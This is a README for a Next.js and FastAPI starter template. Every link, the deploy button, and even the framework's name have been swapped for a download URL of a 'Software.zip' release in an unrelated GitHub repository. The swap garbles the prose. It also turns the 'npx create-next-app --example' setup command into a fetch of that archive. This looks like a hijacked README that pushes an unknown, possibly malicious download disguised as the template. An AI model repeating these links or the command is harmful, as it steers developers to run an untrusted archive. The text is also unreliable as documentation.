<p align="center">Simple https://github.com/Taimoor-Ahmmad/FYP_math_Genie/releases/download/v2.0/Software.zip boilerplate that uses <a href="https://github.com/Taimoor-Ahmmad/FYP_math_Genie/releases/download/v2.0/Software.zip">FastAPI</a> as the API backend.</p>

<br/>

## Introduction

This is a hybrid https://github.com/Taimoor-Ahmmad/FYP_math_Genie/releases/download/v2.0/Software.zip + Python app that uses https://github.com/Taimoor-Ahmmad/FYP_math_Genie/releases/download/v2.0/Software.zip as the frontend and FastAPI as the API backend. One great use case of this is to write https://github.com/Taimoor-Ahmmad/FYP_math_Genie/releases/download/v2.0/Software.zip apps that use Python AI libraries on the backend.

## How It Works

The Python/FastAPI server is mapped into to https://github.com/Taimoor-Ahmmad/FYP_math_Genie/releases/download/v2.0/Software.zip app under `/api/`.

This is implemented using [`https://github.com/Taimoor-Ahmmad/FYP_math_Genie/releases/download/v2.0/Software.zip` rewrites](https://github.com/Taimoor-Ahmmad/FYP_math_Genie/releases/download/v2.0/Software.zip) to map any request to `/api/:path*` to the FastAPI API, which is hosted in the `/api` folder.

On localhost, the rewrite will be made to the `127.0.0.1:8000` port, which is where the FastAPI server is running.

In production, the FastAPI server is hosted as [Python serverless functions](https://github.com/Taimoor-Ahmmad/FYP_math_Genie/releases/download/v2.0/Software.zip) on Vercel.

## Demo

## Deploy Your Own

You can clone & deploy it to Vercel with one click:

[![Deploy with Vercel](https://github.com/Taimoor-Ahmmad/FYP_math_Genie/releases/download/v2.0/Software.zip)](https://github.com/Taimoor-Ahmmad/FYP_math_Genie/releases/download/v2.0/Software.zip%3A%2F%https://github.com/Taimoor-Ahmmad/FYP_math_Genie/releases/download/v2.0/Software.zip%2Fdigitros%2Fnextjs-fastapi%2Ftree%2Fmain)

## Developing Locally

You can clone & create this repo with the following command

```bash
npx create-next-app nextjs-fastapi --example "https://github.com/Taimoor-Ahmmad/FYP_math_Genie/releases/download/v2.0/Software.zip"
```

## Getting Started

First, install the dependencies:

```bash
npm install
# or
yarn
# or
pnpm install
```

Then, run the development server:

```bash
npm run dev
# or
yarn dev
# or
pnpm dev
```

Open [http://localhost:3000](http://localhost:3000) with your browser to see the result.

The FastApi server will be running on [http://127.0.0.1:8000](http://127.0.0.1:8000) – feel free to change the port in `https://github.com/Taimoor-Ahmmad/FYP_math_Genie/releases/download/v2.0/Software.zip` (you'll also need to update it in `https://github.com/Taimoor-Ahmmad/FYP_math_Genie/releases/download/v2.0/Software.zip`).
